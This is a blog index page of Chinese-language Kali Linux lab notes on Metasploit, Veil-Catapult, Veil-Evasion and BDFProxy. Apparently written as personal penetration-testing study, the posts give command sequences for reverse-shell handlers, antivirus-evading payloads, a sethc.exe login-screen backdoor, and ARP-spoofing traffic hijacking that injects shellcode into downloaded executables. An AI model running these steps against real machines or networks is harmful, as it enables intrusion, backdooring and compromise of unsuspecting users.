<!DOCTYPE html>



  


<html class="theme-next pisces use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Pisces',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%83)%EF%BC%9AMetasploit%20Framework/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%83)%EF%BC%9AMetasploit%20Framework/" itemprop="url">Kali Linux笔记(九十七)：Metasploit Framework</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T23:03:27+08:00">
                2020-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  613 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Metasploit简介"><a href="#1-Metasploit简介" class="headerlink" title="1. Metasploit简介"></a>1. Metasploit简介</h4><ul>
<li>目前最流行、最强大、最具扩展性的渗透测试平台软件</li>
<li>基于Metasploit进行渗透测试和漏洞分析的流程和方法</li>
<li>2003年由HD More发布第一版，2007年用ruby语言重写<ul>
<li>框架继承了渗透测试标准（PETS）思想</li>
<li>一定程度上统一了渗透测试和漏洞研究的工作环境</li>
<li>新的攻击代码可以比较容易的加入框架</li>
</ul>
</li>
<li>开发活跃版本更新频繁（每周）<ul>
<li>早期版本基于社区力量维护，被Rapid 7收购后打造出其商业版产品</li>
<li>目前分化为四个版本，社区版本依然十分活跃</li>
<li>HD More说：为Metasploit写书是种自虐！</li>
<li>2014年之后市场上没有再出现新的Metasploit教材</li>
</ul>
</li>
<li>MSF默认集成与Kali Linux之中</li>
<li>使用postgresql数据库存储数据<ul>
<li>早期版本需要先启动数据库再启动msf</li>
</ul>
</li>
</ul>
<h4 id="2-Offensive-security出版的Metasploit教材"><a href="#2-Offensive-security出版的Metasploit教材" class="headerlink" title="2. Offensive security出版的Metasploit教材"></a>2. Offensive security出版的Metasploit教材</h4><ul>
<li>被HD More称之为当时最好的Metasploit教材（2011/2012）</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=144aVD96LCB_5xdUWmKebc7BkchWv2QVQtOqNq30xve4KObh2u7BhrX1JMqY0H1NUibxS0qASTL2uCv7gEALUQMlJlr4ndyXh4x71-rFR6DefFqkhxJy4gFHfFaqLzJEd0cAFbqPvAr5oLuNxRHTOlhMn_SjoA&file_name=/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E4%B8%AD%E6%96%87%E7%89%88.PNG" alt="Metasploit渗透测试指南中文版"></p>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=84fcBHLJJTY5FAluOqNf2Tw1IALdMGqUsf9wF1A0g3ihI1xneE6PAQmBU28jS3mcyPGMdXP_JkkVvO4d1ISJ8arU1B22FvM6IN2YNv7OH_dpHXF1U-F1AOTIkMpOLcWZNV4jXdNeVWw_PyE-1sAHflwaXdKDHA&file_name=/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97%E8%8B%B1%E6%96%87%E7%89%88.PNG" alt="Metasploit渗透测试指南英文版"></p>
<h4 id="3-版本对比"><a href="#3-版本对比" class="headerlink" title="3. 版本对比"></a>3. 版本对比</h4><ul>
<li>Pro版是企业级全功能的高级渗透测试平台</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=ea735c3HGYl5hKCwmuyFtToahfu60TTSlvWTOqfWWNafPKL2NPjb7i6KIEG67_ZKQ7h0EM7yCATB3PtW2gVy1CFw0EXvsy3an65x7EFTbtT3asqRSVWuJ4eb1tb_LwAin0zmqEU7OA&file_name=/Metasploit%E7%89%88%E6%9C%AC%E5%AF%B9%E6%AF%94.PNG" alt="Metasploit版本对比"></p>
<h4 id="4-MSF架构"><a href="#4-MSF架构" class="headerlink" title="4. MSF架构"></a>4. MSF架构</h4><p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=b235UCYkpqOIBeYNf7kc5HlxJ0eWYh1S2O-jFz2VRLpa6pUG6JUo5HyE8BT2tjxe_FwhwuCItZ2hfi_cTywJU1vg1h6fnntH3PG51uPW5-Pjs3UG2xl8JmTb&file_name=/MSF%E6%9E%B6%E6%9E%84.PNG" alt="MSF架构"></p>
<ul>
<li>Rex<ul>
<li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li>
<li>处理socket连接访问、协议应答（http/SSL/SMB等）</li>
<li>编码转换（XOR、Base64、Unicode）</li>
</ul>
</li>
<li>Msf::Core<ul>
<li>提供Msf的核心基本API，是框架的核心能力实现库</li>
</ul>
</li>
<li>Msf::Base<ul>
<li>提供友好的API接口，便于模块调用的库</li>
</ul>
</li>
<li>Plugin插件<ul>
<li>连接和调用外部扩展功能和系统</li>
</ul>
</li>
</ul>
<h4 id="5-MSF模块"><a href="#5-MSF模块" class="headerlink" title="5. MSF模块"></a>5. MSF模块</h4><ul>
<li>/usr/share/metasploit-framework/modules/</li>
<li>技术功能模块（非流程模块）<ul>
<li>Exploit：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li>
<li>Payload：成功exploit之后，真正在目标系统执行的代码或指令<ul>
<li>Shellcode或系统命令</li>
<li>三种Payload：/usr/share/metasploit-framework/modules/payloads/</li>
<li>Single：all-in-one</li>
<li>Stager：目标计算机内存有限时，先传输一个较小的payload用于建立连接</li>
<li>Stagers：利用stager建立的连接下载的后续payload</li>
<li>Stager、Stagers都有多种类型，适用于不同场景</li>
<li>Shellcode是payload的一种，由于其建立正向/反向shell而得名</li>
</ul>
</li>
<li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有payload的exploit模块）</li>
<li>Encoders：对payload进行加密，躲避AV检查的模块</li>
<li>Nops：提高payload稳定性及维持大小</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%85%AD)%EF%BC%9AVeil-Catapult/" itemprop="url">Kali Linux笔记(九十六)：Veil-Catapult</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T21:36:41+08:00">
                2020-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  527 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Veil-catapult"><a href="#1-Veil-catapult" class="headerlink" title="1. Veil-catapult"></a>1. Veil-catapult</h4><ul>
<li>Payload的投递<ul>
<li>集成veil-evasion生成免杀payload或自定义payload</li>
<li>使用Impacket上传二进制payload文件（前提需要有一个账号密码）</li>
<li>使用passing-the-hass出发执行payload</li>
</ul>
</li>
<li>Payload直接在内存中运行（类似于SMBexec）<ul>
<li>不向硬盘写入payload文件，避免文件型病毒查杀软件</li>
</ul>
</li>
<li>▲ 2020.2.17 依赖Veil-catapult</li>
<li>▲ Github地址：<a href="https://github.com/Veil-Framework/Veil-Catapult" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil-Catapult</a></li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
</ul>
</li>
<li>Window 7（需要有powershell）<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ifconfig</code></strong>查看网络连接，关闭防火墙</li>
<li><strong><code>🔺命令：cmd → powershell</code></strong>尝试能否开启powershell</li>
<li>抓包查看是否有数据到本地电脑</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：vi /etc/veil/settings.py</code></strong> → SPAWN_CATAPULT_HANDLER=”true”（默认情况下是投放完payload不开启msf，对EXE delivery起作用，对Standalone payloads不起作用）</li>
<li><strong><code>🔺命令：msfconsole</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handler/</code></strong>（使用控制台）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong>（设置payload）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：set lhost 本机的IP</code></strong>（监听IP）</li>
<li><strong><code>🔺命令：set lport 4444</code></strong>（监听端口4444）</li>
<li><strong><code>🔺命令：set EXITFUNC thread</code></strong>（以线程的方式执行）</li>
<li><strong><code>🔺命令：show options</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong>（执行）</li>
<li><strong><code>🔺命令：session -l</code></strong>（查看session）</li>
<li><strong><code>🔺命令：session -i 1</code></strong>（选择的session1）→ <strong><code>🔺命令：getuid/getpid</code></strong></li>
</ul>
</li>
<li>veil-catapult<ul>
<li>Standalone payloads</li>
<li>EXE delivery</li>
</ul>
</li>
<li>Standalone payloads<ul>
<li>⭐Powershell injector（投放两个脚本+一个powershell指令，适用于Win7及以上版本）</li>
<li>⭐Barebones python injector（同Powershell injector相同原理，适用于Powershell injector注入失败情况下）</li>
<li>⭐Sethc backdoor（用cmd.exe替换C:\Windows\System32\sethc.exe，Sethc为连按shift五次的粘滞键程序，一般可通过物理接触）</li>
<li>⭐Execute custom command </li>
</ul>
</li>
</ul>
</li>
<li>Window 7（需要有powershell）<ul>
<li>任务管理器查看注入的进程（通过pid）</li>
<li>Kali执行完Sethc backdoor后，在登陆界面连按shift五次，修改win7密码</li>
<li>重启挂载Kali硬盘<ul>
<li><strong><code>🔺命令：fdisk -l</code></strong>查看挂载的硬盘</li>
<li><strong><code>🔺命令：mount /dev/sda2（大文件硬盘）/mnt</code></strong></li>
<li><strong><code>🔺命令：cd /mnt/Windows/System32</code></strong></li>
<li><strong><code>🔺命令：mv sethc.exe sethc.exe.old</code></strong></li>
<li><strong><code>🔺命令：cp cmd.exe sethc.exe</code></strong></li>
<li>拔出光盘，<strong><code>🔺命令：reboot</code></strong></li>
</ul>
</li>
<li>还原快照</li>
</ul>
</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=7819XGFlPCu-xbCZmwpD2Wlh_iFzp7KNhOpJNMGI7aEla9tmikg4gpPT8Ti-NpyPs0OTpMvVMAcQHAyYCHv4618Konbj4molFR9e8sqxWxZdpjjZFeECumQKh3Q00HAckcUo&file_name=/cmd%E6%9B%BF%E6%8D%A2sethc.exe.PNG" alt="cmd替换sethc"></p>
<ul>
<li>Kali<ul>
<li>开启Wireshark抓包，抓取ping的rely包</li>
<li>Standalone payloads<ul>
<li>Execute custom command（执行子命令）</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%94)%EF%BC%9AVeil-Evasion/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/17/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%BA%94)%EF%BC%9AVeil-Evasion/" itemprop="url">Kali Linux笔记(九十五)：Veil-Evasion</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-17T21:22:15+08:00">
                2020-02-17
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  326 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Veil-evasion"><a href="#1-Veil-evasion" class="headerlink" title="1. Veil-evasion"></a>1. Veil-evasion</h4><ul>
<li>▲ 无病毒体的文件：向window的注册表写入病毒体/向硬件写入病毒体</li>
<li>属于Veil-framework框架的一部分</li>
<li>由python语言编写</li>
<li>用于自动生成免杀payload<ul>
<li>集成msf payload，支持自定义payload</li>
<li>集成各种注入技术（系统进程）</li>
<li>集成各种第三方工具<ul>
<li>Hypersion、PEScrambler、BackDoor Factory</li>
</ul>
</li>
<li>集成各种开发打包运行环境<ul>
<li>Python：pyinstaller/py2exe</li>
<li>C#：mono for.NET</li>
<li>C：mingw32<ul>
<li>▲ 2020.2.17 安装依赖包的时候发生错误，从Github上下载也存在错误</li>
<li>▲ Veil-evasion改名集成于Veil-Framework</li>
<li>▲ 从Github下载的包，在PyInstaller生成EXE文件时无法生成文件</li>
<li>▲ Github地址：<a href="https://github.com/Veil-Framework/Veil" target="_blank" rel="noopener">https://github.com/Veil-Framework/Veil</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-Veil-evasion–Kali"><a href="#2-Veil-evasion–Kali" class="headerlink" title="2. Veil-evasion–Kali"></a>2. Veil-evasion–Kali</h4><ul>
<li><strong><code>🔺命令：apt-get install veil-evasion</code></strong>（安装Veil-evasion）</li>
<li><strong><code>🔺命令：veil-evasion yes</code></strong>（安装脚本安装）<ul>
<li>python</li>
<li>pywin32</li>
<li>pycrypto</li>
<li>Ruby（三个选项勾选）</li>
<li>Go</li>
</ul>
</li>
<li><strong><code>🔺命令：update</code></strong>（升级）</li>
<li><strong><code>🔺命令：list</code></strong>（集成的pyloads，生成的shellcode默认放在/var/lib/veil-evasion/output）<ul>
<li><strong><code>🔺命令：35</code></strong>（python/shell_inject/aes_encrypt，未加密USE_PYHERION → N）</li>
<li><strong><code>🔺命令：35</code></strong>（python/shell_inject/aes_encrypt，加密USE_PYHERION → Y）</li>
<li>查看两个shell的免杀效果（查杀网站）</li>
</ul>
</li>
<li>▲ /var/lib/veil-evasion/output/handles（可运行在msf上的配置文件）</li>
<li><strong><code>🔺命令：msfconsole -r</code></strong> 具体配置文件路径<ul>
<li><strong><code>🔺命令：jobs</code></strong>（查看运行的任务）</li>
<li><strong><code>🔺命令：sessions</code></strong>（查看运行的session）<ul>
<li><strong><code>🔺命令：session -i 1</code></strong>（进行交互shell）</li>
</ul>
</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/" itemprop="url">Kali Linux笔记(九十四)：BDFProxy</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:53:34+08:00">
                2020-02-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  557 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-Bdfproxy"><a href="#1-Bdfproxy" class="headerlink" title="1. Bdfproxy"></a>1. Bdfproxy</h4><ul>
<li>Bdfproxy(mitmproxy)<ul>
<li>基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）</li>
</ul>
</li>
<li>补充内容<ul>
<li>全站HTTPS防注入（微软每个补丁都带马）</li>
<li>PE文件证书签名可被清除</li>
<li>PE Header -&gt; Optional Header -&gt; Certificate Table（Address and size）<ul>
<li>全部用0覆盖</li>
<li>BDF默认清除数字签名</li>
</ul>
</li>
</ul>
</li>
<li><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></li>
<li>▲ 2020.2.15 BDFProxy已不再受支持</li>
<li>▲ 2020.2.15 BDFProxy的链接<a href="https://github.com/secretsquirrel/BDFProxy.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy.git</a></li>
<li>▲ 2020.2.15 BDFProxy的模块导入存在问题</li>
</ul>
<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9336aWJqiZjtaArClI5zv5GF7qvZA6KpPHKRugRf2TAOe6D-oobV0bvsV0xCtK4XB0Df3zGDAsxanUdAKP_qoQZk3XTZaTI_o29Y-y6yLsYAgqMxGEGji0QUAH33O9OvIQYprCA598ZfaA&file_name=/Josh%20and%20Mark%20Russinovich.PNG" alt="Josh and Mark Russionovich"></p>
<h4 id="2-bdfproxy–ARP-spoof"><a href="#2-bdfproxy–ARP-spoof" class="headerlink" title="2. bdfproxy–ARP spoof"></a>2. bdfproxy–ARP spoof</h4><ul>
<li>Kali<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：apt-get install mitmproxy,backdoor-factory,bdfproxy</code></strong></li>
<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong> </li>
<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080</code></strong></li>
<li><strong><code>🔺命令：iptables -L</code></strong>（查看防火墙转发规则）</li>
<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
<li>proxyMode = transparent</li>
<li>HOST = Kali的IP（所有的HOST需要修改）</li>
</ul>
</li>
<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
<li><strong><code>🔺命令：msfdb init</code></strong></li>
<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
<li><strong><code>🔺命令：jobs</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：arpspoof -i eth0 -t Window7的IP Kali的IP</code></strong></li>
</ul>
</li>
<li>Window 7<ul>
<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
<li><strong><code>🔺命令：ipconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：arp -a</code></strong>查看网关MAC地址</li>
<li>在Kali欺骗之后，再次<strong><code>🔺命令：arp -a</code></strong>查看MAC地址</li>
<li>网页访问Putty官网下载putty</li>
<li>双击下载的putty</li>
</ul>
</li>
<li>Kali<ul>
<li>查看流量日志是否注入成功</li>
<li>在win7开启putty后，是否有反弹的shell</li>
<li><strong><code>🔺命令：session -i 1</code></strong></li>
<li><strong><code>🔺命令：shell</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-bdfproxy–Fack-AP"><a href="#3-bdfproxy–Fack-AP" class="headerlink" title="3. bdfproxy–Fack AP"></a>3. bdfproxy–Fack AP</h4><ul>
<li>▲ 2020.2.15 因无无线网卡，此实验暂无完成</li>
<li>Mana创建Fack AP</li>
<li>Bdfproxy代理注入代码</li>
<li>Msf侦听反弹shell</li>
<li>Kali<ul>
<li><strong><code>🔺命令：apt-get install mana-toolkit</code></strong></li>
<li><strong><code>🔺命令：reboot</code></strong> </li>
<li><strong><code>🔺命令：vi /etc/mana-toolkit/hostapd-mana.conf</code></strong><ul>
<li>修改无线SSID名称 → kfc-free</li>
</ul>
</li>
<li><strong><code>🔺命令：./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</code></strong><ul>
<li>▲ 需要插无线网卡</li>
<li>修改phy的名称为插入的无线网卡设备号名称</li>
<li>清空iptables的规则</li>
